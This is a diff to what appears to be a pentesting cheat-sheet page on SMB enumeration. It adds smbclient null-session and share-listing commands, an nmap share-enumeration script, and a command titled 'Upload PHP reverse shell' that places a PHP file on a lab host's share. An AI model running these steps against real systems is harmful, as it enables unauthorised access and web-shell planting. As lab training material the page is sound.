@@ -9,17 +9,7 @@ description: Server Message Block
 
 {% tabs %}
 {% tab title="smbclient" %}
-{% code title="Without Credentials" %}
-```
-smbclient --no-pass //IP/<Share>
-```
-{% endcode %}
-
-{% code title="Connect to share" %}
-```bash
-smbclient -N \\\\IP\Share
-```
-{% endcode %}
+## <mark style="color:purple;">Without Credentials</mark>
 
 {% code title="List Resource list" %}
 ```bash
@@ -30,6 +20,30 @@ smbclient -L <IP>
 {% code title="List Null session" %}
 ```bash
 smbclient -N <IP>
+```
+{% endcode %}
+
+{% code title="Connect to share" %}
+```bash
+smbclient -N \\\\IP\Share
+```
+{% endcode %}
+
+{% code title="List Resources list + Null session" %}
+```bash
+smbclient -L \\10.10.10.123 -N
+```
+{% endcode %}
+
+{% code title="Upload PHP reverse shell" %}
+```bash
+smbclient -N //10.10.10.123/Development -c 'put cmd.php tokyo.php'
+```
+{% endcode %}
+
+{% code title="Without Credentials" %}
+```
+smbclient --no-pass //IP/<Share>
 ```
 {% endcode %}
 
@@ -138,6 +152,12 @@ set RHOSTS <target_ip>
 run
 ```
 {% endcode %}
+{% endtab %}
+
+{% tab title="Nmap-Scripts" %}
+```bash
+nmap --script smb-enum-shares.nse -p445 10.10.10.123
+```
 {% endtab %}
 {% endtabs %}
 
